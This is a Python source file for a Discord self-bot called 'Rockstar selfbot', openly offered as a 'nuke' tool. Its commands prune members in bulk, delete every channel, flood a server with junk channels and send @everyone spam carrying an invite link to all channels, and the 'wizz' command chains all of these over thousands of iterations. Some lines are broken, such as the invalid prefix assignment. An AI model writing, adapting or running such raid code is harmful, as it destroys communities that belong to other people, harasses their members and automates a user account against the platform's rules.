import os
import discord
from discord.ext import commands
from colorama import Fore
import random
import pystyle
import sys
from datetime import datetime, timedelta
import asyncio
import logging
import datetime
from threading import Thread
import queue
global msg
from pystyle import*
import asyncio
PREFIX = "+"
bot = commands.Bot(command_prefix= ., self_bot=True)

client = discord.Client()

@bot.event
async def on_ready():
  print(f"""{Fore.RED} .....+ R O C K S T A R S E L F   B O T +.....
•       made by - rockstar392       •
•      {bot.user} Type .Help     •
&---&----&----&----&----&----&----& """)

@bot.command()
async def prune(ctx, days: int = 1, rc: int = 0, *, reason: str = "ROCKSTAR ON TOP BXBY"):
    await ctx.message.delete() ; roles = []
    for role in ctx.guild.roles:
        if len(role.members) == 0:
            continue
        else:
            roles.append(role)
    hm = await ctx.guild.prune_members(days=days, roles=roles, reason=reason); await ctx.send(f"pruned {hm} Members ")


@bot.command()
async def ping(ctx):
    await ctx.reply('My ping is {0}ms'.format(round(bot.latency, 1)))

@bot.command()
async def userinfo(ctx, member: discord.Member):
    await ctx.reply(f'Username : {member.name}#{member.discriminator} \n\n ID : {member.id} \n\n Created at : {member.created_at} \n\n Joined at : {member.joined_at} \n\n Avatar : {member.avatar_url}')

@bot.command()
async def serverinfo(ctx):
    await ctx.reply(f'Server name : {ctx.guild.name} \n\n Server ID : {ctx.guild.id} \n\n Server created at : {ctx.guild.created_at} \n\n Server owner : {ctx.guild.owner} \n\n Server region : {ctx.guild.region} \n\n Server icon : {ctx.guild.icon_url}')

@bot.command()
async def online(ctx):
    emoji = '<a:onlinetr:1100182634728017941>'
    status = 'Connected To M A X SB V1'
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.streaming, name=status), status=discord.Status.online, afk=False)
    await ctx.reply(f"Status updated to  {status}!")

@bot.command(name="createchannels", aliases=["masschannel"])
async def masschannel(ctx, amount: int = 25, *, name="Rockstar Rule Cord"):
    for i in range(amount):
        try:
            await ctx.guild.create_text_channel(name=name)
            print(f"Created channel")
        except discord.Forbidden:
            print(f"I don't have the necessary permissions to create channels")
        except discord.HTTPException as e:
            print(f"An error occurred while creating channel: {e}")

@bot.command(name='delchannels', aliases=["dall", "dch"])
async def delete_all_channels(ctx):
    for ch in ctx.guild.channels:
        try:
            await ch.delete()
            print(f"Deleted {ch}")
        except discord.Forbidden:
            print(f"I don't have the necessary permissions to delete {ch}")
        except discord.HTTPException as e:
            print(f"An error occurred while deleting {ch}: {e}")

@bot.command(name="spamall", aliases=["sa"])
async def spam_to_all_channels(ctx, amount: int = 50, *, text="@everyone @here ROCKSTAR ON TOP BXBY https://discord.com/invite/HCRhHz6AY6"):
    for i in range(amount):
        for ch in ctx.guild.channels:
            try:
                await ch.send(text)
                print(f"Message sent to {ch}")
            except:
                print(f"Can't send message to {ch}")
@bot.command()
async def Help(ctx):
    message = (
        "**```js\n"
"          R O C K S T A R   S É L F B O T  \n"
"            - rockstar392 - \n"

"         •H͢ ͢E͢ ͢L͢ ͢P͢ ͢I͢ ͢N͢ ͢G͢ ͢ ͢ ͢C͢ ͢M͢ ͢D͢ •\n"
"             + nuke\n"
"             + general\n"
        "```**"
    )
    await ctx.send(message)

@bot.command()
async def nuke(ctx):
    message = (
        "**```js\n"
"          R O C K S T A R   S É L F B O T  \n"
"            - rockstar392 - \n"

"           •N͢ ͢U͢ ͢K͢ ͢E͢ ͢ ͢ ͢C͢ ͢M͢ ͢D͢•\n"
"             + prune\n"
"             + spamall\n"
"             + masschannel (amount)(nam) \n"
"             + deletechannel (dch)\n"
"             + wizz\n"
        "```**"
    )
    await ctx.send(message)

@bot.command()
async def general(ctx):
    message = (
        "**```js\n"
"          R O C K S T A R   S É L F B O T  \n"
"            - rockstar392 - \n"

"         •G͢ ͢E͢ ͢N͢ ͢E͢ ͢R͢ ͢A͢ ͢L͢ ͢ ͢ ͢C͢ ͢M͢ ͢D͢•\n"
"             + online\n"
"             + ping\n"
"             + membercount (mc) \n"
"             + serverinfo\n"
"             + userinfo\n"
"             + restart\n"
        "```**"
    )
    await ctx.send(message)

@bot.command(aliases=['mc'])
async def membercount(ctx):
    member_count = ctx.guild.member_count
    await ctx.send(f"```The server has {member_count} Members.```")

@bot.command()
async def restart(ctx):
    await ctx.reply('- `Restarting...`')
    os.execl(sys.executable, sys.executable, *sys.argv)

@bot.command()
async def wizz(ctx, amount: int = 5):
    for maxontop in ctx.guild.channels:
            await maxontop.delete()
            print(f"Deleted {maxontop}")
    for i in range(5):
            channel_names = ['ROCKSTAR ON TOL','RocK on top', 'RocK Op', 'RocK Op', 'rockstarontop', 'nuked xD']
            await ctx.guild.create_text_channel(name=random.choice(channel_names))
            print(f"Created channel")
    for i in range(9999):
        tospam = ['@everyone @here NUKED BY ROCKSTAR https://discord.com/invite/HCRhHz6AY6', '@everyone @here Wizzed by ROCKSTAR JOIN FAST https://discord.com/invite/HCRhHz6AY6', '@everyone @here https://discord.com/invite/HCRhHz6AY6']
        for ch in ctx.guild.channels:
                await ch.send(random.choice(tospam))


bot.remove_command("help")
bot.run("",bot=False)
